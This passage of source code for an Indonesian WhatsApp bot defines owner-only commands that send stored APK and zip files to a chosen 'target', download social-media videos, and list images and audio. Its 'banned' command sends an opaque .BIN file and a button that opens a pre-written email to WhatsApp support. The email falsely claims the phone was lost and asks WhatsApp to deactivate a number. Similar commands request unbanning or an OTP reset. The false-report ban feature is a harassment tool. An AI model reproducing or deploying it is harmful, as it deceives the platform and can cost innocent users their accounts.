teksooooo += `│\n└────────────⭓\n\n*Total ada : ${zipnye.length} \n\n Contoh 1 : sendzip Haikal + sambil reply pesan target* \n\n Contoh 2 : yozip Haikal`
m.reply(teksooooo)
}
break
case 'yozip':{
if (!isCreator) return m.reply(mess.owner)
if (args.length < 1) return reply('Masukan text yang ada di list zip')
let teks = `${q}`
{
haikal.sendMessage(from, { document: fs.readFileSync(`./database/zip/${teks}.zip`), mimetype: 'application/zip', fileName: `${teks}`, caption: `${teks}` }, { quoted: m})
}
}
break
case 'sendzip': {
if (!isCreator) return m.reply(mess.owner)
if (!q) return m.reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listzip`)
let teks = `${q}`
{
haikal.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/zip/${teks}.zip`), mimetype: 'application/zip', fileName: `${teks}`, caption: `${teks}` }, { quoted: m})
m.reply(`Sukses Mengirim Pesan Zip Ke ${m.quoted.sender}`)
}
}
break
case 'addapk':{
if (!isCreator) return m.reply(mess.owner)
if (args.length < 1) return reply('Nama apk apa')
let teks = `${q}`
{
if (apknye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await haikal.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./database/apk/${teks}.apk`)
fs.writeFileSync('./database/apk.json', JSON.stringify(apknye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan apk\nCek dengan cara ${prefix}listapk`)
}
}
break
case 'delapk':{
if (!isCreator) return m.reply(mess.owner)
if (args.length < 1) return reply('Masukan text yang ada di listapk')
let teks = `${q}`
{
if (!apknye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = apknye.indexOf(teks)
apknye.splice(wanu, 1)
fs.writeFileSync('./database/zip.json', JSON.stringify(apknye))
fs.unlinkSync(`./database/apk/${teks}.apk`)
reply(`Sukses delete Apk ${teks}`)
}
}
break
case 'listapk': {
if (!isCreator) return m.reply(mess.owner)
let teksoooooo = '┌──⭓「 *LIST APK* 」\n│\n'
for (let x of apknye) {
teksoooooo += `│⭔ ${x}\n`
}
teksoooooo += `│\n└────────────⭓\n\n*Total ada : ${apknye.length} \n\n Contoh 1 : sendapk Haikal + sambil reply pesan target* \n\n Contoh 2 : yoapk Haikal`
m.reply(teksoooooo)
}
break
case 'yoapk':{
if (!isCreator) return m.reply(mess.owner)
if (args.length < 1) return reply('Masukan text yang ada di listapk')
let teks = `${q}`
{
haikal.sendMessage(from, { document: fs.readFileSync(`./database/apk/${teks}.apk`), mimetype: 'application/vnd.android.package-archive', fileName: `${teks}`, caption: `${teks}` }, { quoted: m})
}
}
break
case 'sendapk': {
if (!isCreator) return m.reply(mess.owner)
if (!q) return m.reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listzip`)
let teks = `${q}`
{
haikal.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/apk/${teks}.apk`), mimetype: 'application/vnd.android.package-archive', fileName: `${teks}`, caption: `${teks}` }, { quoted: m})
m.reply(`Sukses Mengirim Pesan Apk Ke ${m.quoted.sender}`)
}
}
break
//=================================================//
case 'addvn':{
if (!isCreator) return m.reply(mess.owner)
if (args.length < 1) return reply('Nama audionya apa')
if (vnnye.includes(q)) return reply("Nama tersebut sudah di gunakan")
let delb = await haikal.downloadAndSaveMediaMessage(quoted)
vnnye.push(q)
await fsx.copy(delb, `./database/Audio/${q}.mp3`)
fs.writeFileSync('./database/vnadd.json', JSON.stringify(vnnye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`)
}
break
case 'delvn':{
if (!isCreator) return m.reply(mess.owner)
if (args.length < 1) return reply('Masukan query')
if (!vnnye.includes(q)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = vnnye.indexOf(q)
vnnye.splice(wanu, 1)
fs.writeFileSync('./database/vnadd.json', JSON.stringify(vnnye))
fs.unlinkSync(`./database/Audio/${q}.mp3`)
reply(`Sukses delete vn ${q}`)
}
break
case 'listvn':{
let teksooo = '┌──⭓「 *LIST VN* 」\n│\n'
for (let x of vnnye) {
teksooo += `│⭔ ${x}\n`
}
teksooo += `│\n└────────────⭓\n\n*Total ada : ${vnnye.length}*`
reply(teksooo)
}
break
case 'addmsg': {
                if (!m.quoted) throw 'Reply Pesan Yang Ingin Disave Di Database'
                if (!text) throw `Example : ${prefix + command} nama file`
                let msgs = global.db.data.database
                if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list pesan`
                msgs[text.toLowerCase()] = quoted.fakeObj
m.reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'
    
Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
            }
            break
            case 'sendlist': {
                if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
                haikal.copyNForward(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", msgs[text.toLowerCase()], true)
                m.reply(`Sukses Mengirim Pesan Ke ${m.quoted.sender}`)
            }
            break
            case 'listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./src/database.json'))
	        let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = '「 LIST DATABASE 」\n\n'
		for (let i of seplit) {
		    teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        m.reply(teks)
	    }
	    break
            case 'delmsg': case 'deletemsg': {
	        let msgs = global.db.data.database
	        if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar didalam list pesan`)
		delete msgs[text.toLowerCase()]
		m.reply(`Berhasil menghapus '${text}' dari list pesan`)
            }
	    break
case 'getmsg': {
                if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
                haikal.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break

//=================================================//
case 'assalamualaikum': case 'p': {
m.reply(`Waalaikumsalam`)
}
break
//=================================================//
case 'banned': {
if (!isCreator) return m.reply(mess.owner)
 var message = {
document : fs.readFileSync("./baseikal/sound/ngeselin.BIN"),
"fileName": `BANNED WHATSAPP`,
caption: ` Silahkan Klick Yang Ada di Bawah Dan Anda Akan Di Alihkan Ke Gmail Anda 
Note : Harap Pastikan Gmail Anda Bersih Dari Backlist`,
footer: ` Xyrvzaa`,
mentionedJid: m.mentionedJid,
templateButtons: [{ urlButton: {displayText: `BANNED`, url: 'mailto:support@whatsapp.com?Body=Hello,%20please%20deactivate%20this%20number,%20because%20I%20have%20lost%20my%20cellphone%20and%20someone%20is%20using%20my%20number,%20please%20deactivate%20my%20number:%2B+62xxxxxx'}}],
headerType: 1
}
haikal.sendMessage(from, message, { quoted:m })
}
break
//=================================================//
case 'unbaned': {
if (!isCreator) return m.reply(mess.owner)
 var message = {
document : fs.readFileSync("./baseikal/sound/ngeselin.BIN"),
"fileName": `UNBANED WHATSAPP`,
caption: ` Silahkan Klick Yang Ada di Bawah Dan Anda Akan Di Alihkan Ke Gmail Anda 
Note : Harap Pastikan Gmail Anda Bersih Dari Backlist`,
footer: ` Xyrvzaa`,
mentionedJid: m.mentionedJid,
templateButtons: [{ urlButton: {displayText: `UNBANED`, url: 'mailto:support@whatsapp.com?Body=Please%20reactivate%20my%20number%20because%20I%20didnt%20violate%20any%20WhatsApp%20rules,%20suddenly%20my%20number%20was%20banned,%20please%20reactivate%20this%20number:%2B+62xxxxxxx%20because%20I%20didnt%20do%20anything%20wrong,%20suddenly%20my%20number%20was%20banned%20when%20I%20entered%20the%20group%20so%20I%20ask%20the%20respectable%20WhatsApp%20party,%20please%20reactivate%20my%20number,%20thank%20you'}}],
headerType: 1
}
haikal.sendMessage(from, message, { quoted:m })
}
break
//=================================================//
case 'resetverif': {
if (!isCreator) return m.reply(mess.owner)
 var message = {
document : fs.readFileSync("./baseikal/sound/ngeselin.BIN"),
"fileName": `UNBANED WHATSAPP`,
caption: ` Silahkan Klick Yang Ada di Bawah Dan Anda Akan Di Alihkan Ke Gmail Anda 
Note : Harap Pastikan Gmail Anda Bersih Dari Backlist`,
footer: ` Xyrvzaa`,
mentionedJid: m.mentionedJid,
templateButtons: [{ urlButton: {displayText: `RESET CODE`, url: 'mailto:support@whatsapp.com?Body=Please%20research%20the%20OTP%20code%20for%20this%20number%20because%20someone%20else%20accidentally%20logged%20in%20with%20my%20number%20and%20I%20had%20to%20wait%208%20hours,%20please%20research%20again%20at%20this%20number:%2B+62xxxxx'}}],
headerType: 1
}
haikal.sendMessage(from, message, { quoted:m })
}
break

case 'kalkulator': {
if (!isCreator) return m.reply(mess.owner)
if (args.length < 1) return m.reply(`*Example :*\n${prefix}kalkulator 2 * 5\n\n*List Bilangan :*\n•> Kali : *\n•> Bagi : /\n•> Tambah : +\n•> Kurang : -`)
let qsd = args.join(" ")
if (typeof mathjs.evaluate(qsd) !== 'number') {
m.reply('Error')
} else {
m.reply(`\`\`\`「 Kalkulator 」\`\`\`\n\n*•> Hitung :* ${qsd}\n*•> Hasil :* ${mathjs.evaluate(qsd.replace(/×/g, "*").replace(/x/g, "*").replace(/÷/g, "/"))}`)
}
}
break

//=================================================//
case "fbvideo": case "fbreels":{
if (!isCreator) return m.reply(mess.owner)
if (!q) return m.reply('Link nya kak?\n\nContoh : .facebook https://www.facebook.com/reel/478437244198357')
m.reply('Sabar Cuy Loading')
let res = await facebook(q)
let ghd = await haikal.sendMessage(from,{video:{url: res.url[0].url},caption: "𝙎𝙪𝙠𝙨𝙚𝙨 ✅"},{quoted:m})
}
break
case "igvideo": case "igreels":{
if (!isCreator) return m.reply(mess.owner)
if (!q) return m.reply('Link nya kak?\n\nContoh : .instagram https://www.instagram.com/tv/CEjIHlnpyvI/?igshid=NTdlMDg3MTY=')
m.reply('Sabar Cuy Loading')
let res = await instagram(q)
let ghd = await haikal.sendMessage(from,{video:{url: res.url[0].url},caption: "𝙎𝙪𝙠𝙨𝙚𝙨 ✅"},{quoted:m})
}
break
case "twitvideo":{
if (!isCreator) return m.reply(mess.owner)
if (!q) return m.reply('Link nya kak?\n\nContoh : .twitter https://twitter.com/FCBarcelona_es/status/1615392117026586628?s=20&t=Djtl01fwdxTX1I5g-tm72A')
m.reply('Sabar Cuy Loading')
let res = await twitter(q)
let ghd = await haikal.sendMessage(from,{video:{url: res.url[0].url},caption: "𝙎𝙪𝙠𝙨𝙚𝙨 ✅"},{quoted:m})
}
break
case "tiktokvideo":{
if (!isCreator) return m.reply(mess.owner)
if (!q) return m.reply(`Link Nya Kak???\nContoh ${prefix+command} https://vm.tiktok.com/ZSRApJY1K/`)
m.reply('Sabar Cuy Loading')
let res = await tiktok(q)
let ghd = await haikal.sendMessage(from,{video:{url: res.url[0].url},caption: "Sukses"},{quoted:m})
}
break
case "tiktokaudio":{
if (!isCreator) return m.reply(mess.owner)
if (!q) return reply (`Link Nya Kak???\nContoh ${prefix+command} https://vm.tiktok.com/ZSRApJY1K/`)
m.reply('Sabar Cuy Loading')
let res = await tiktok(q)
let ghd = await haikal.sendMessage(from,{audio:{url: res.url[1].url}, mimetype: "audio/mp4", ptt:false},{quoted:m})
}
break
case 'hw1': {
haikal.sendMessage(from, { image: hw1,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw2': {
haikal.sendMessage(from, { image: hw2,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw3': {
haikal.sendMessage(from, { image: hw3,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw4': {
haikal.sendMessage(from, { image: hw4,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw5': {
haikal.sendMessage(from, { image: hw5,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw6': {
haikal.sendMessage(from, { image: hw6,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw7': {
haikal.sendMessage(from, { image: hw7,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw8': {
haikal.sendMessage(from, { image: hw8,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw9': {
haikal.sendMessage(from, { image: hw9,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw10': {
haikal.sendMessage(from, { image: hw10,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw11': {
haikal.sendMessage(from, { image: hw11,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw12': {
haikal.sendMessage(from, { image: hw12,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw13': {
haikal.sendMessage(from, { image: hw13,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw14': {
haikal.sendMessage(from, { image: hw14,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw15': {
haikal.sendMessage(from, { image: hw15,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw16': {
haikal.sendMessage(from, { image: hw16,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw17': {
haikal.sendMessage(from, { image: hw17,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw18': {
haikal.sendMessage(from, { image: hw18,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw19': {
haikal.sendMessage(from, { image: hw19,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw20': {
haikal.sendMessage(from, { image: hw20,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw21': {
haikal.sendMessage(from, { image: hw21,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw22': {
haikal.sendMessage(from, { image: hw22,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw23': {
haikal.sendMessage(from, { image: hw23,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw24': {
haikal.sendMessage(from, { image: hw24,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw25': {
haikal.sendMessage(from, { image: hw25,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw26': {
haikal.sendMessage(from, { image: hw26,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw27': {
haikal.sendMessage(from, { image: hw27,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw28': {
haikal.sendMessage(from, { image: hw28,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw29': {
haikal.sendMessage(from, { image: hw29,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw30': {
haikal.sendMessage(from, { image: hw30,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw31': {
haikal.sendMessage(from, { image: hw31,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw32': {
haikal.sendMessage(from, { image: hw32,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw33': {
haikal.sendMessage(from, { image: hw33,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw34': {
haikal.sendMessage(from, { image: hw34,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw35': {
haikal.sendMessage(from, { image: hw35,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw36': {
haikal.sendMessage(from, { image: hw36,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw37': {
haikal.sendMessage(from, { image: hw37,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw38': {
haikal.sendMessage(from, { image: hw38,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw39': {
haikal.sendMessage(from, { image: hw39,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw40': {
haikal.sendMessage(from, { image: hw40,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw41': {
haikal.sendMessage(from, { image: hw41,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw42': {
haikal.sendMessage(from, { image: hw42,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw43': {
haikal.sendMessage(from, { image: hw43,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw44': {
haikal.sendMessage(from, { image: hw44,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw45': {
haikal.sendMessage(from, { image: hw45,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw46': {
haikal.sendMessage(from, { image: hw46,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw47': {
haikal.sendMessage(from, { image: hw47,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw48': {
haikal.sendMessage(from, { image: hw48,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw49': {
haikal.sendMessage(from, { image: hw49,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw50': {
haikal.sendMessage(from, { image: hw50,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw51': {
haikal.sendMessage(from, { image: hw51,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw52': {
haikal.sendMessage(from, { image: hw52,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw53': {
haikal.sendMessage(from, { image: hw53,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw54': {
haikal.sendMessage(from, { image: hw54,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw55': {
haikal.sendMessage(from, { image: hw55,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw56': {
haikal.sendMessage(from, { image: hw56,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw57': {
haikal.sendMessage(from, { image: hw57,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw58': {
haikal.sendMessage(from, { image: hw58,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw59': {
haikal.sendMessage(from, { image: hw59,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw60': {
haikal.sendMessage(from, { image: hw60,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw61': {
haikal.sendMessage(from, { image: hw61,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw62': {
haikal.sendMessage(from, { image: hw62,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw63': {
haikal.sendMessage(from, { image: hw63,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw64': {
haikal.sendMessage(from, { image: hw64,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw65': {
haikal.sendMessage(from, { image: hw65,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw66': {
haikal.sendMessage(from, { image: hw66,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw67': {
haikal.sendMessage(from, { image: hw67,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw68': {
haikal.sendMessage(from, { image: hw68,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw69': {
haikal.sendMessage(from, { image: hw69,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw70': {
haikal.sendMessage(from, { image: hw70,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw71': {
haikal.sendMessage(from, { image: hw71,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw72': {
haikal.sendMessage(from, { image: hw72,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw73': {
haikal.sendMessage(from, { image: hw73,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw74': {
haikal.sendMessage(from, { image: hw74,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw75': {
haikal.sendMessage(from, { image: hw75,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw76': {
haikal.sendMessage(from, { image: hw76,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw77': {
haikal.sendMessage(from, { image: hw77,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw78': {
haikal.sendMessage(from, { image: hw78,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw79': {
haikal.sendMessage(from, { image: hw79,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
//=================================================//
case 'listaudio':
touchmebree = [
{
title: `©️ sound MODS WA`,
rows: [
{title: `AUDIO 1`, rowId: `${prefix}sound1`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 2`, rowId: `${prefix}sound2`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 3`, rowId: `${prefix}sound3`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 4`, rowId: `${prefix}sound4`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 5`, rowId: `${prefix}sound5`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 6`, rowId: `${prefix}sound6`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 7`, rowId: `${prefix}sound7`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 8`, rowId: `${prefix}sound8`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 9`, rowId: `${prefix}sound9`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 10`, rowId: `${prefix}sound10`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 11`, rowId: `${prefix}sound11`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 12`, rowId: `${prefix}sound12`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 13`, rowId: `${prefix}sound13`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 14`, rowId: `${prefix}sound14`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 15`, rowId: `${prefix}sound15`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 16`, rowId: `${prefix}sound16`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 17`, rowId: `${prefix}sound17`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 18`, rowId: `${prefix}sound18`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 19`, rowId: `${prefix}sound19`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 20`, rowId: `${prefix}sound20`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
`},
{title: `AUDIO 21`, rowId: `${prefix}sound21`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 22`, rowId: `${prefix}sound22`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 23`, rowId: `${prefix}sound23`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 24`, rowId: `${prefix}sound24`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 25`, rowId: `${prefix}sound25`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 26`, rowId: `${prefix}sound26`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 27`, rowId: `${prefix}sound27`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 28`, rowId: `${prefix}sound28`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 29`, rowId: `${prefix}sound29`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 30`, rowId: `${prefix}sound30`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 31`, rowId: `${prefix}sound31`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 32`, rowId: `${prefix}sound32`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 33`, rowId: `${prefix}sound33`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 34`, rowId: `${prefix}sound34`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 35`, rowId: `${prefix}sound35`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 36`, rowId: `${prefix}sound36`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 37`, rowId: `${prefix}sound37`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 38`, rowId: `${prefix}sound38`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 39`, rowId: `${prefix}sound39`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 40`, rowId: `${prefix}sound40`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
`},
{title: `AUDIO 41`, rowId: `${prefix}sound41`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 42`, rowId: `${prefix}sound42`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 43`, rowId: `${prefix}sound43`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 44`, rowId: `${prefix}sound44`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 45`, rowId: `${prefix}sound45`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 46`, rowId: `${prefix}sound46`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 47`, rowId: `${prefix}sound47`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 48`, rowId: `${prefix}sound48`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 49`, rowId: `${prefix}sound49`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 50`, rowId: `${prefix}sound50`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 51`, rowId: `${prefix}sound51`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 52`, rowId: `${prefix}sound52`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 53`, rowId: `${prefix}sound53`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 54`, rowId: `${prefix}sound54`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 55`, rowId: `${prefix}sound55`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 56`, rowId: `${prefix}sound56`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 57`, rowId: `${prefix}sound57`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 58`, rowId: `${prefix}sound58`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 59`, rowId: `${prefix}sound59`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 60`, rowId: `${prefix}sound60`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
`},
{title: `AUDIO 61`, rowId: `${prefix}sound61`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 62`, rowId: `${prefix}sound62`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 63`, rowId: `${prefix}sound63`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 64`, rowId: `${prefix}sound64`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 65`, rowId: `${prefix}sound65`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 66`, rowId: `${prefix}sound66`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 67`, rowId: `${prefix}sound67`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 68`, rowId: `${prefix}sound68`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 69`, rowId: `${prefix}sound69`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
